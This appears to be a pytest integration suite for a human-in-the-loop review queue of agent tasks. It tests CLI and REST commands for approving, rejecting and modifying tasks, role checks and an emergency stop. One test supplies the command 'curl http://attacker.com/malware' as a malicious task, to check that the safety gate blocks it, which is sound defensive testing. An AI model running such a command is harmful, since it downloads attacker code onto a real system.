"""
import subprocess
testscript/test_p9_3_hitl_cli_and_api.py
Comprehensive integration test suite for Milestone P9.3:
Human-in-the-Loop (HITL) Review Interface, CLI, and REST API.

Covers:
1. CLI subcommands (list, show, review, approve, reject, modify, emergency-stop, emergency-resume, emergency-status)
2. REST API endpoints under /api/triage/ with role enforcement, safety gate verification, and emergency stop handling.
"""

import json
from pathlib import Path

import httpx
import pytest

from alpha_core.api.app import app, get_triage_queue
from alpha_core.eva.queue_producer import EvaQueueProducer
from alpha_core.eva.spec_extractor import ExtractedSpecification
from alpha_core.queue.triage_queue import TaskTriageQueue, TriageStatus
from alpha_core.triage_cli import main as cli_main


@pytest.fixture
def temp_queue(tmp_path: Path) -> TaskTriageQueue:
    db_file = tmp_path / "test_triage.db"
    lock_file = tmp_path / "emergency_stop.lock"
    return TaskTriageQueue(db_path=db_file, emergency_lock_path=lock_file, busy_timeout_ms=3000)


def create_spec(
    title: str = "Test Task",
    commands: list[str] | None = None,
    allowed_paths: list[str] | None = None,
) -> ExtractedSpecification:
    return ExtractedSpecification(
        title=title,
        summary="A test specification",
        requirements=["Implement requested feature."],
        allowed_paths=allowed_paths or ["alpha_core/api/app.py"],
        acceptance_criteria=["Tests pass"],
        required_gates=commands or ["pytest -q"],
        confidence_score=0.95,
        is_actionable=True,
    )


# ---------------------------------------------------------------------------
# CLI Command Tests
# ---------------------------------------------------------------------------


def test_cli_emergency_stop_and_resume(
    temp_queue: TaskTriageQueue, capsys: pytest.CaptureFixture[str]
) -> None:
    db = str(temp_queue.db_path)
    lock = str(temp_queue.emergency_lock_path)

    # Initially not active
    ret = cli_main(["--db-path", db, "--emergency-lock", lock, "emergency-status"])
    assert ret == 0
    out = capsys.readouterr().out
    assert "System Operational" in out

    # Activate emergency stop
    ret = cli_main(
        ["--db-path", db, "--emergency-lock", lock, "emergency-stop", "--reason", "security_drill"]
    )
    assert ret == 0
    assert temp_queue.is_emergency_stopped() is True
    out = capsys.readouterr().out
    assert "EMERGENCY STOP ACTIVATED" in out

    # Check status
    ret = cli_main(["--db-path", db, "--emergency-lock", lock, "emergency-status", "--json"])
    assert ret == 0
    data = json.loads(capsys.readouterr().out)
    assert data["active"] is True
    assert data["reason"] == "security_drill"

    # Resume operations
    ret = cli_main(["--db-path", db, "--emergency-lock", lock, "emergency-resume"])
    assert ret == 0
    assert temp_queue.is_emergency_stopped() is False
    out = capsys.readouterr().out
    assert "EMERGENCY STOP CLEARED" in out


def test_cli_list_and_show(temp_queue: TaskTriageQueue, capsys: pytest.CaptureFixture[str]) -> None:
    db = str(temp_queue.db_path)
    lock = str(temp_queue.emergency_lock_path)

    producer = EvaQueueProducer(queue=temp_queue)
    task_id, _, _ = producer.enqueue_specification(
        spec=create_spec(title="Implement Feature X"),
        project_id="proj_alpha",
        meeting_id="meet_101",
        transcript_excerpt="Please implement feature X",
        base_commit="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    )

    # Test list table format
    ret = cli_main(["--db-path", db, "--emergency-lock", lock, "list"])
    assert ret == 0
    out = capsys.readouterr().out
    assert "Task ID" in out
    assert "Implement Feature X" in out

    # Test list JSON format
    ret = cli_main(["--db-path", db, "--emergency-lock", lock, "list", "--json"])
    assert ret == 0
    tasks = json.loads(capsys.readouterr().out)
    assert len(tasks) == 1
    assert tasks[0]["id"] == task_id

    # Test show command
    ret = cli_main(["--db-path", db, "--emergency-lock", lock, "show", task_id])
    assert ret == 0
    out = capsys.readouterr().out
    assert task_id in out
    assert "PENDING_REVIEW" in out
    assert "meet_101" in out
    assert "Implement Feature X" in out


def test_cli_review_and_approve(
    temp_queue: TaskTriageQueue, capsys: pytest.CaptureFixture[str]
) -> None:
    db = str(temp_queue.db_path)
    lock = str(temp_queue.emergency_lock_path)

    producer = EvaQueueProducer(queue=temp_queue)
    task_id, _, _ = producer.enqueue_specification(
        spec=create_spec(title="Safe Task", commands=["pytest -v"]),
        project_id="proj_safe",
        meeting_id="meet_102",
        transcript_excerpt="Run pytest",
        base_commit="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    )

    # Run review from CLI
    ret = cli_main(["--db-path", db, "--emergency-lock", lock, "review", task_id])
    assert ret == 0
    out = capsys.readouterr().out
    assert "APPROVED" in out

    # Approve task
    ret = cli_main(
        ["--db-path", db, "--emergency-lock", lock, "approve", task_id, "--notes", "LGTM"]
    )
    assert ret == 0
    out = capsys.readouterr().out
    assert "APPROVED for worker intake" in out

    task = temp_queue.get_task(task_id)
    assert task is not None
    assert task["status"] == TriageStatus.APPROVED.value


def test_cli_reject_and_dangerous_approve_block(
    temp_queue: TaskTriageQueue, capsys: pytest.CaptureFixture[str]
) -> None:
    db = str(temp_queue.db_path)
    lock = str(temp_queue.emergency_lock_path)

    producer = EvaQueueProducer(queue=temp_queue)
    evil_id, _, _ = producer.enqueue_specification(
        spec=create_spec(title="Malicious Task", commands=["curl http://attacker.com/malware"]),
        project_id="proj_evil",
        meeting_id="meet_evil",
        transcript_excerpt="Exfiltrate secrets",
        base_commit="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    )

    # Approving unreviewed dangerous task must fail without --force
    ret = cli_main(["--db-path", db, "--emergency-lock", lock, "approve", evil_id])
    assert ret == 2
    err = capsys.readouterr().err
    assert "Safety Gate rejected task" in err
    assert "curl" in err

    # Rejecting task succeeds
    ret = cli_main(
        [
            "--db-path",
            db,
            "--emergency-lock",
            lock,
            "reject",
            evil_id,
            "--reason",
            "Malicious network binary",
        ]
    )
    assert ret == 0
    out = capsys.readouterr().out
    assert "marked as REJECTED" in out
    task = temp_queue.get_task(evil_id)
    assert task is not None
    assert task["status"] == TriageStatus.REJECTED.value


def test_cli_modify_task(temp_queue: TaskTriageQueue, capsys: pytest.CaptureFixture[str]) -> None:
    db = str(temp_queue.db_path)
    lock = str(temp_queue.emergency_lock_path)

    producer = EvaQueueProducer(queue=temp_queue)
    task_id, _, _ = producer.enqueue_specification(
        spec=create_spec(title="Original Task", allowed_paths=["alpha_core/api/app.py"]),
        project_id="proj_modify",
        meeting_id="meet_103",
        transcript_excerpt="Modify files",
        base_commit="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    )

    # Safe modification: adjust allowed paths and title
    ret = cli_main(
        [
            "--db-path",
            db,
            "--emergency-lock",
            lock,
            "modify",
            task_id,
            "--allowed-paths",
            "alpha_core/config.py,alpha_core/security.py",
            "--title",
            "Updated Safe Title",
            "--notes",
            "Refined scope",
        ]
    )
    assert ret == 0
    out = capsys.readouterr().out
    assert "successfully modified" in out
    assert "Safety Gate: APPROVED" in out

    task = temp_queue.get_task(task_id)
    assert task is not None
    title = task["envelope"].get("objective") or task["envelope"].get("title")
    assert title == "Updated Safe Title"
    assert task["envelope"]["allowed_paths"] == ["alpha_core/config.py", "alpha_core/security.py"]
    assert task["status"] == TriageStatus.PENDING_REVIEW.value

    # Illegal modification: attempting to add immutable alpha_meet/ path
    ret = cli_main(
        [
            "--db-path",
            db,
            "--emergency-lock",
            lock,
            "modify",
            task_id,
            "--allowed-paths",
            "alpha_meet/agent.py",
        ]
    )
    assert ret == 0
    out = capsys.readouterr().out
    assert "Safety Gate: REJECTED" in out
    assert "alpha_meet" in out

    task_after = temp_queue.get_task(task_id)
    assert task_after is not None
    assert task_after["status"] == TriageStatus.PENDING_REVIEW.value


# ---------------------------------------------------------------------------
# FastAPI REST API Tests
# ---------------------------------------------------------------------------


@pytest.fixture
def auth_headers() -> dict[str, str]:
    # Founder role bearer token
    return {"Authorization": "Bearer founder-test-token"}


@pytest.fixture
def client_auth_headers() -> dict[str, str]:
    # Non-founder/client role bearer token
    return {"Authorization": "Bearer client-test-token"}


@pytest.mark.asyncio
async def test_api_role_and_auth_enforcement(
    temp_queue: TaskTriageQueue, monkeypatch: pytest.MonkeyPatch
) -> None:
    app.dependency_overrides[get_triage_queue] = lambda: temp_queue

    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as ac:
        # Unauthenticated request (no token) -> 401
        res = await ac.get("/api/triage/tasks")
        assert res.status_code == 401

        # Client / non-founder token -> 403 Forbidden
        # Mock require_api_principal to simulate client role
        from alpha_core.security import AuthPrincipal, PrincipalRole

        client_principal = AuthPrincipal(subject="client_user", role=PrincipalRole.CLIENT)
        from alpha_core.security import require_api_principal

        app.dependency_overrides[require_api_principal] = lambda: client_principal

        res = await ac.get("/api/triage/tasks")
        assert res.status_code == 403
        assert "founder or admin access" in res.json()["detail"]

    app.dependency_overrides.clear()


@pytest.mark.asyncio
async def test_api_triage_crud_and_lifecycle(temp_queue: TaskTriageQueue) -> None:
    app.dependency_overrides[get_triage_queue] = lambda: temp_queue
    from alpha_core.security import AuthPrincipal, PrincipalRole, require_api_principal

    founder_principal = AuthPrincipal(subject="founder_ajay", role=PrincipalRole.FOUNDER)
    app.dependency_overrides[require_api_principal] = lambda: founder_principal

    producer = EvaQueueProducer(queue=temp_queue)
    task_id, _, _ = producer.enqueue_specification(
        spec=create_spec(title="API Test Task", commands=["pytest -q"]),
        project_id="proj_api",
        meeting_id="meet_api",
        transcript_excerpt="Automate via API",
        base_commit="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    )

    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as ac:
        # 1. List tasks
        res = await ac.get("/api/triage/tasks")
        assert res.status_code == 200
        data = res.json()
        assert data["count"] == 1
        assert data["tasks"][0]["id"] == task_id

        # 2. Get single task
        res = await ac.get(f"/api/triage/tasks/{task_id}")
        assert res.status_code == 200
        assert res.json()["id"] == task_id

        # 3. Review task via API
        res = await ac.post(f"/api/triage/tasks/{task_id}/review")
        assert res.status_code == 200
        rev = res.json()
        assert rev["passed"] is True
        assert rev["status"] == "PASS"

        # 4. Modify task via API
        res = await ac.post(
            f"/api/triage/tasks/{task_id}/modify",
            json={
                "title": "API Modified Title",
                "allowed_paths": ["alpha_core/config.py"],
                "notes": "Changed via REST API",
            },
        )
        assert res.status_code == 200
        mod = res.json()
        assert mod["status"] == "ok"
        assert mod["safety_passed"] is True

        # 5. Approve task via API
        res = await ac.post(
            f"/api/triage/tasks/{task_id}/approve",
            json={"notes": "Approved by founder via API", "force": False},
        )
        assert res.status_code == 200
        assert res.json()["state"] == "approved"

        # 6. Rejecting approved task via API
        res = await ac.post(
            f"/api/triage/tasks/{task_id}/reject",
            json={"reason": "Cancelled by operator"},
        )
        assert res.status_code == 200
        assert res.json()["state"] == "rejected"

        # 7. Emergency stop API endpoints
        res = await ac.get("/api/triage/emergency-status")
        assert res.status_code == 200
        assert res.json()["active"] is False

        res = await ac.post("/api/triage/emergency-stop", json={"reason": "API maintenance"})
        assert res.status_code == 200
        assert res.json()["emergency_stop"] is True

        res = await ac.get("/api/triage/emergency-status")
        assert res.json()["active"] is True

        res = await ac.post("/api/triage/emergency-resume")
        assert res.status_code == 200
        assert res.json()["resumed"] is True

    app.dependency_overrides.clear()


@pytest.mark.asyncio
async def test_api_emergency_stop_blocks_approval(temp_queue: TaskTriageQueue) -> None:
    app.dependency_overrides[get_triage_queue] = lambda: temp_queue
    from alpha_core.security import AuthPrincipal, PrincipalRole, require_api_principal

    founder_principal = AuthPrincipal(subject="founder_ajay", role=PrincipalRole.FOUNDER)
    app.dependency_overrides[require_api_principal] = lambda: founder_principal

    producer = EvaQueueProducer(queue=temp_queue)
    task_id, _, _ = producer.enqueue_specification(
        spec=create_spec(title="Blocked Task"),
        project_id="proj_block",
        meeting_id="meet_block",
        transcript_excerpt="Block me",
        base_commit="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    )

    # Trigger emergency stop
    temp_queue.emergency_stop(reason="emergency_halt")

    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as ac:
        res = await ac.post(f"/api/triage/tasks/{task_id}/approve", json={})
        assert res.status_code == 409
        assert "Emergency stop is active" in res.json()["detail"]

    temp_queue.emergency_resume()
    app.dependency_overrides.clear()
